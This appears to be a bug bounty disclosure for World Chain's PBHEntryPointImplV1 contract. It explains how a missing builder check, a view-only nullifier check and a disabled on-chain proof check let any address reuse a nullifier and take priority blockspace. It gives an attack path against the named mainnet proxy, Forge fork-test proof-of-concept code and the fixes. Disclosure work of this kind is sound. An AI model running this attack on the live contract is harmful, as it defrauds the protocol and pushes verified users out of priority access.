# Missing access control on `handleAggregatedOps` and view-only nullifier check allow any address to claim unlimited PBH priority blockspace without a World ID credential

## Description

### Brief/Intro

`PBHEntryPointImplV1.handleAggregatedOps` is the function through which PBH (Priority Blockspace for Humans) bundles reach the EIP-4337 EntryPoint. The contract defines an `onlyBuilder` modifier and applies it to every privileged function — except `handleAggregatedOps`. Simultaneously, the internal nullifier check (`_verifyPbh`) is declared `view`: it reads `nullifierHashes[n]` but never writes it. The write that marks a nullifier as spent (`spendNullifierHashes`) is a separate, builder-gated transaction. On World Chain mainnet the contract is deployed with `worldId == address(0)`, which by NatSpec design causes all ZK proof verification to be skipped. The three bugs compose: any Ethereum address — without a World ID credential, without being an authorized builder — can call `handleAggregatedOps` an unbounded number of times with the same nullifier hash, routing arbitrary user-operation bundles through the PBH priority pipeline and exhausting the monthly rate limit for any World ID identity.

### Vulnerability Details

#### Bug 1 — Missing `onlyBuilder` on `handleAggregatedOps`

**File:** `pkg/contracts/src/pbh/PBHEntryPointImplV1.sol`

The `onlyBuilder` modifier is defined at line 150 and correctly applied to `spendNullifierHashes` (line 355). It is not applied to `handleAggregatedOps`:

```solidity
// Line 150 — modifier is defined
modifier onlyBuilder() {
    if (!authorizedBuilder[msg.sender]) {
        revert UnauthorizedBuilder();
    }
    _;
}

// Line 258 — onlyBuilder is ABSENT
function handleAggregatedOps(
    IEntryPoint.UserOpsPerAggregator[] calldata opsPerAggregator,
    address payable beneficiary
) external virtual onlyProxy nonReentrant {      // ← no onlyBuilder here
    ...
    entryPoint.handleAggregatedOps(opsPerAggregator, beneficiary);
}

// Line 355 — onlyBuilder IS applied to the companion function
function spendNullifierHashes(uint256[] calldata _nullifierHashes)
    external virtual onlyProxy onlyBuilder { ... }
```

Any `msg.sender` passes the `handleAggregatedOps` entry check. The only gate that exists is inside the EIP-4337 `EntryPoint` itself, which has no knowledge of the PBH builder authorization model.

#### Bug 2 — TOCTOU: `_verifyPbh` is view-only; nullifier write is a separate transaction

**File:** `pkg/contracts/src/pbh/PBHEntryPointImplV1.sol`, lines 236–253

```solidity
// Line 236 — internal VIEW: reads nullifierHashes, never writes
function _verifyPbh(uint256 signalHash, PBHPayload memory pbhPayload) internal view {
    // Line 238: check — reads the mapping
    if (nullifierHashes[pbhPayload.nullifierHash] != 0) {
        revert InvalidNullifier(pbhPayload.nullifierHash, signalHash);
    }
    PBHExternalNullifier.verify(pbhPayload.pbhExternalNullifier, numPbhPerMonth, signalHash);

    // Line 247: ZK verification only if worldId != address(0)
    if (address(worldId) != address(0)) {
        worldId.verifyProof(...);
    }
    // ← function returns; nullifierHashes[n] is STILL 0
}
```

`_verifyPbh` is called inside `handleAggregatedOps` (line 285) and inside the public `verifyPbh` (line 229–231). Neither call writes to `nullifierHashes`. The only write is in `spendNullifierHashes`:

```solidity
// Line 356 — write happens here, in a completely separate transaction
nullifierHashes[_nullifierHashes[i]] = block.number;
```

Because the check and the mark happen in different transactions, any number of callers can pass the check simultaneously in the same block, before any builder calls `spendNullifierHashes`.

#### Bug 3 — `worldId == address(0)` on mainnet: ZK proof verification entirely skipped

By NatSpec (lines 174–177 of `initialize`):

> "If set to the 0 address, then it will be assumed that verification will take place off chain."

On World Chain mainnet (`chainId = 480`), `worldId` is `address(0)` at the deployed proxy `0x0000000000A21818Ee9F93BB4f2AAad305b5397C`. The conditional at line 247 is `false` for every call. No ZK proof is verified on-chain. An attacker supplies `proof = [0,0,0,0,0,0,0,0]` and any `nullifierHash` value; both pass.

#### Compound attack path

1. Attacker picks any `nullifierHash N` (e.g., `42`). `nullifierHashes[42] == 0`.
2. Attacker (not an authorized builder) calls `handleAggregatedOps` with `nullifierHash = 42`, `proof = [0…0]`. Passes: no `onlyBuilder` guard, `worldId = 0` skips ZK check, `nullifierHashes[42] == 0` passes the TOCTOU check.
3. Attacker calls `handleAggregatedOps` **again** in the same block (or next block before any builder calls `spendNullifierHashes`) with `nullifierHash = 42`. Passes again for the same reasons.
4. Repeat without limit. The attacker's bundles are relayed to the EIP-4337 EntryPoint as if they were legitimate PBH bundles, consuming priority blockspace.

The `nonReentrant` guard and transient storage anti-collision check (`tload(hashedOps)`) both operate within a single call and provide no cross-transaction protection.

### Impact Details

- **Who is affected:** The PBH system guarantee — "Priority Blockspace for Humans" is reserved for verified World ID holders — is void on mainnet. Any Ethereum address can submit PBH bundles.
- **What is lost:** The monthly per-identity rate limit (`numPbhPerMonth`, currently 29 PBH txs/month) can be bypassed an unlimited number of times. A single attacker can flood the priority blockspace with bogus or self-serving bundles, starving legitimate World ID users of priority access.
- **Severity:** Critical. The core protocol guarantee (PBH reserved for World ID humans) is permanently undermined on mainnet, the exploit is permissionless (no credential, no privileged key, no frontrunning required), and the two bugs are independently exploitable (either one alone enables the attack given `worldId = 0`).
- **Precedent:** EIP-4337 bundler authorization failures have been accepted as Critical in prior bug bounty reports when they allow unauthorized parties to submit operations through the protocol's priority pipeline.

### References

| Location | Description |
|----------|-------------|
| `src/pbh/PBHEntryPointImplV1.sol:150–155` | `onlyBuilder` modifier defined |
| `src/pbh/PBHEntryPointImplV1.sol:258–292` | `handleAggregatedOps` — missing `onlyBuilder` |
| `src/pbh/PBHEntryPointImplV1.sol:236–253` | `_verifyPbh` view-only, TOCTOU root cause |
| `src/pbh/PBHEntryPointImplV1.sol:247–252` | `worldId == address(0)` ZK skip |
| `src/pbh/PBHEntryPointImplV1.sol:355–361` | `spendNullifierHashes` — write is separate tx, correctly guarded |
| `src/pbh/PBHEntryPointImplV1.sol:174–177` | `initialize` NatSpec documenting `worldId = 0` design |

**Fix summary:** Add `onlyBuilder` to `handleAggregatedOps`. Move the nullifier write into `_verifyPbh` (making it non-view) so check-and-mark are atomic within `handleAggregatedOps`.

---

## Proof of Concept

A Forge fork test against World Chain mainnet proves all three facts on-chain.

**Test file:** `pkg/contracts/test/poc/fork/LG001_AC003_NullifierTOCTOU_fork.t.sol`  
**Target contract:** PBHEntryPoint proxy `0x0000000000A21818Ee9F93BB4f2AAad305b5397C` (World Chain, chainId 480)

```bash
cd contracts/tfh/world-chain/pkg/contracts
WORLD_CHAIN_RPC_URL=<world-chain-rpc> forge test \
  --match-path "test/poc/fork/LG001_AC003_NullifierTOCTOU_fork.t.sol" -vvv
```

Expected output:
```
[PASS] test_LG001_AC003_l2_worldId_zero_and_builder_set_on_mainnet() (gas: ...)
[PASS] test_LG001_l3_same_nullifier_passes_verifyPbh_twice_on_mainnet() (gas: ...)
[PASS] test_AC003_l3_unauthorized_caller_not_rejected_on_mainnet() (gas: ...)

Test result: ok. 3 passed; 0 failed
```

### Key assertions annotated

**Test 1 — Confirms `worldId == address(0)` on mainnet (ZK check skipped for all callers):**
```solidity
// Proves the ZK verification branch at PBHEntryPointImplV1.sol:247 is never entered
address worldId = address(pbhEntryPoint.worldId());
assertEq(worldId, address(0),
    "worldId is address(0) on mainnet -- ZK proof verification is entirely skipped");

// Confirms the builder set is non-empty — the authorization model exists but is unenforced
assertTrue(pbhEntryPoint.authorizedBuilder(AUTHORIZED_BUILDER));

// Attacker is not authorized — proves the missing guard is the only thing that matters
assertFalse(pbhEntryPoint.authorizedBuilder(ATTACKER));
```

**Test 2 — Proves TOCTOU: same nullifier passes `verifyPbh` twice, no state change:**
```solidity
// Pre: nullifier 42 is unspent
assertEq(pbhEntryPoint.nullifierHashes(SHARED_NULLIFIER), 0);

// First call passes (worldId=0 skips ZK; nullifier not spent)
pbhEntryPoint.verifyPbh(signalHash, p);

// STILL 0 — _verifyPbh wrote nothing (PBHEntryPointImplV1.sol:236 is `internal view`)
assertEq(pbhEntryPoint.nullifierHashes(SHARED_NULLIFIER), 0,
    "After call 1: nullifierHashes[42] still 0 -- no state write");

// Second call with IDENTICAL nullifier — also passes (TOCTOU window confirmed on mainnet)
pbhEntryPoint.verifyPbh(signalHash, p);
assertEq(pbhEntryPoint.nullifierHashes(SHARED_NULLIFIER), 0,
    "After call 2: still 0 -- same nullifier accepted twice with no write");
```

**Test 3 — Proves `handleAggregatedOps` has no `onlyBuilder` guard:**
```solidity
// Attacker is definitely not authorized
assertFalse(pbhEntryPoint.authorizedBuilder(ATTACKER));

// Attacker calls handleAggregatedOps — if onlyBuilder were present this MUST revert
// with UnauthorizedBuilder selector (0x1f6a65b6)
vm.prank(ATTACKER);
(bool success, bytes memory ret) = address(pbhEntryPoint).call(
    abi.encodeCall(IPBHEntryPoint.handleAggregatedOps, (bundle, payable(ATTACKER)))
);

// Key assertion: revert selector is NOT UnauthorizedBuilder — guard is absent
if (!success && ret.length >= 4) {
    bytes4 selector = bytes4(ret);
    assertNotEq(selector, PBHEntryPointImplV1.UnauthorizedBuilder.selector,
        "Revert must NOT be UnauthorizedBuilder -- guard is missing from handleAggregatedOps");
}

// Contrast: spendNullifierHashes DOES enforce onlyBuilder (same contract, same modifier)
vm.prank(ATTACKER);
vm.expectRevert(PBHEntryPointImplV1.UnauthorizedBuilder.selector);
pbhEntryPoint.spendNullifierHashes(toSpend);
// ↑ This expectRevert passes — proving the modifier works and was simply never applied
//   to handleAggregatedOps
```

---

## Mitigation

Two independent fixes are both required:

### Fix 1 — Add `onlyBuilder` to `handleAggregatedOps`

**File:** `pkg/contracts/src/pbh/PBHEntryPointImplV1.sol`, line 261

```solidity
// Before (line 258–261)
function handleAggregatedOps(
    IEntryPoint.UserOpsPerAggregator[] calldata opsPerAggregator,
    address payable beneficiary
) external virtual onlyProxy nonReentrant {

// After
function handleAggregatedOps(
    IEntryPoint.UserOpsPerAggregator[] calldata opsPerAggregator,
    address payable beneficiary
) external virtual onlyProxy onlyBuilder nonReentrant {
```

This restricts PBH bundle submission to addresses in the `authorizedBuilder` mapping, matching the access model that already protects `spendNullifierHashes`.

### Fix 2 — Make nullifier marking atomic with the check

**File:** `pkg/contracts/src/pbh/PBHEntryPointImplV1.sol`, lines 236–253

```solidity
// Before — _verifyPbh is `internal view`, no write
function _verifyPbh(uint256 signalHash, PBHPayload memory pbhPayload) internal view {
    if (nullifierHashes[pbhPayload.nullifierHash] != 0) {
        revert InvalidNullifier(pbhPayload.nullifierHash, signalHash);
    }
    ...
}  // nullifierHashes never written

// After — remove `view`, mark nullifier spent atomically
function _verifyPbh(uint256 signalHash, PBHPayload memory pbhPayload) internal {
    if (nullifierHashes[pbhPayload.nullifierHash] != 0) {
        revert InvalidNullifier(pbhPayload.nullifierHash, signalHash);
    }
    // Mark spent in the same call — eliminates TOCTOU window entirely
    nullifierHashes[pbhPayload.nullifierHash] = block.number;

    PBHExternalNullifier.verify(pbhPayload.pbhExternalNullifier, numPbhPerMonth, signalHash);
    if (address(worldId) != address(0)) {
        worldId.verifyProof(...);
    }
}
```

With this change, `spendNullifierHashes` becomes redundant for the TOCTOU fix (though it may be retained for any off-chain settlement flow). The public `verifyPbh` function, which is also `view`, would need to either be removed or converted to a non-view function with appropriate access controls.
